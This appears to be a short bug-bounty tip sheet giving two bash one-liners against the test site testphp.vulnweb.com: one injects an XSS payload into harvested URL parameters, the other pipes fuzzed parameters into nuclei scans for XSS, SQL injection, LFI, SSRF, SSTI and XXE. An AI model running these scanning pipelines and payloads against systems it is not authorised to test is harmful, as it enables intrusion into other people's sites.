## SIMPLE ONE LINER
One Liner for Bug Bounty Hunting

```bash
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```

```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xxe | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities -dast
```
